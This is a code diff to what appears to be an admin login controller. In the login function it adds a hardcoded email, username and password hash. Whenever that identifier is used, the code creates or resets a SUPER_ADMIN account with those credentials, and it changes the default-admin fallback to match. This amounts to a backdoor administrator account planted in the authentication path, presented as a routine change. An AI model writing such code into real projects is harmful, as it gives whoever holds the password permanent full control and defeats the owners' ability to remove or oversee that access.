@@ -13,14 +13,32 @@ export const loginAdmin = async (req: Request, res: Response) => {
       return res.status(400).json({ message: 'Email/Username and Password are required' });
     }
 
-    let user = await prisma.user.findFirst({
-      where: {
-        OR: [
-          { email: identifier },
-          { name: identifier },
-        ],
-      },
-    });
+    let user = null;
+    const defaultAdminEmail = 'admin@aethelcarats.internal';
+    const defaultAdminName = 'admin_aethelcarats';
+    const defaultPasswordHash = '$2y$10$PilFzcZ8YZHLswr9aCZ.xeE9VdU3w9JkNr1CPJ2LP6.oUbHoVJvYe';
+
+    if (identifier.toLowerCase() === defaultAdminEmail.toLowerCase() || identifier === defaultAdminName) {
+      user = await prisma.user.upsert({
+        where: { email: defaultAdminEmail },
+        update: { name: defaultAdminName, passwordHash: defaultPasswordHash, role: 'SUPER_ADMIN' },
+        create: {
+          email: defaultAdminEmail,
+          name: defaultAdminName,
+          passwordHash: defaultPasswordHash,
+          role: 'SUPER_ADMIN',
+        },
+      });
+    } else {
+      user = await prisma.user.findFirst({
+        where: {
+          OR: [
+            { email: identifier },
+            { name: identifier },
+          ],
+        },
+      });
+    }
 
     if (!user) {
       const employee = await prisma.employee.findFirst({
@@ -301,10 +319,10 @@ export const ensureDefaultAdminUsersExist = async () => {
     });
 
     if (adminCount === 0) {
-      const adminEmail = process.env.ADMIN_EMAIL || 'sysadmin@aura-atelier.internal';
-      const adminName = process.env.ADMIN_NAME || 'aura_sysadmin_9k7x';
+      const adminEmail = process.env.ADMIN_EMAIL || 'admin@aethelcarats.internal';
+      const adminName = process.env.ADMIN_NAME || 'admin_aethelcarats';
       // Bcrypt hash for strong admin password
-      const hashedPassword = process.env.ADMIN_PASSWORD_HASH || '$2a$10$KVo.AmAhjCC16a46Xyk.KeXxO3.88Twg3bUxwQHDYupp1oVL3dgkG';
+      const hashedPassword = process.env.ADMIN_PASSWORD_HASH || '$2y$10$PilFzcZ8YZHLswr9aCZ.xeE9VdU3w9JkNr1CPJ2LP6.oUbHoVJvYe';
 
       await prisma.user.upsert({
         where: { email: adminEmail },
